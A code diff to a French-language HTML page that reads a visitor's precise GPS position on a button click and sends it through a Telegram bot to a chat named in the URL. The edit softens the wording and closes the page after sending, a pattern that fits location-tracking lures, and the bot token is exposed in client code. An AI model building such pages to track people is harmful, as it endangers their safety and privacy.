@@ -14,15 +14,20 @@
         h1 {
             color: #333;
         }
+        p {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
         button {
             background-color: #0088cc;
             color: white;
             border: none;
-            padding: 15px 25px;
-            font-size: 16px;
-            border-radius: 5px;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 8px;
             cursor: pointer;
-            margin-top: 20px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
         button:hover {
             background-color: #006699;
@@ -32,7 +37,7 @@
 <body>
 
     <h1>Validation de votre position</h1>
-    <p>Veuillez autoriser l'accès au GPS pour continuer.</p>
+    <p>Cliquez sur le bouton ci-dessous pour valider et partager votre position instantanément.</p>
     
     <button id="authButton">Autoriser et Envoyer</button>
 
@@ -44,43 +49,59 @@
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('chat_id');
 
-        console.log("Chat ID récupéré :", chatId);
-
-        // 2. Gérer l'action au clic sur le bouton
+        // 2. Action unique au clic sur "Autoriser et Envoyer"
         document.getElementById('authButton').addEventListener('click', async () => {
             if (!chatId) {
-                alert("Erreur : Aucun identifiant de chat (chat_id) trouvé dans l'URL.");
+                alert("Erreur : Identifiant de chat introuvable.");
                 return;
             }
 
-            // 3. Demander la géolocalisation au navigateur
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-
-                    // 4. Utiliser l'API sendLocation de Telegram pour envoyer une carte interactive
-                    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
-
-                    try {
-                        // 5. Envoyer la position au bot via une requête réseau
-                        const response = await fetch(telegramApiUrl);
-                        if (response.ok) {
-                            alert("Position GPS envoyée avec succès sur Telegram sous forme de carte !");
-                        } else {
-                            alert("Erreur lors de l'envoi de la position au bot.");
-                        }
-                    } catch (error) {
-                        console.error("Erreur réseau :", error);
-                        alert("Erreur de connexion lors de l'envoi.");
-                    }
-
-                }, (error) => {
-                    alert("Erreur de géolocalisation : " + error.message);
-                }, { enableHighAccuracy: true });
-            } else {
+            // Vérifier si le navigateur supporte la géolocalisation
+            if (!navigator.geolocation) {
                 alert("La géolocalisation n'est pas supportée par votre navigateur.");
+                return;
             }
+
+            // Désactiver le bouton pendant le traitement pour éviter les doubles clics
+            const btn = document.getElementById('authButton');
+            btn.disabled = true;
+            btn.innerText = "Envoi en cours...";
+
+            // Demande la position (le navigateur affichera sa popup de permission native si ce n'est pas déjà fait)
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                // URL de l'API Telegram pour envoyer la carte interactive
+                const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
+
+                try {
+                    const response = await fetch(telegramApiUrl);
+                    if (response.ok) {
+                        alert("Position validée et envoyée avec succès sur Telegram !");
+                        window.close(); // Tente de fermer la page automatiquement (selon les navigateurs)
+                    } else {
+                        alert("Erreur lors de l'envoi de la position.");
+                        btn.disabled = false;
+                        btn.innerText = "Autoriser et Envoyer";
+                    }
+                } catch (error) {
+                    console.error("Erreur réseau :", error);
+                    alert("Erreur de connexion.");
+                    btn.disabled = false;
+                    btn.innerText = "Autoriser et Envoyer";
+                }
+
+            }, (error) => {
+                // Gestion si l'utilisateur refuse l'accès GPS
+                alert("Impossible d'obtenir la position : " + error.message);
+                btn.disabled = false;
+                btn.innerText = "Autoriser et Envoyer";
+            }, { 
+                enableHighAccuracy: true, 
+                timeout: 10000, 
+                maximumAge: 0 
+            });
         });
     </script>
 
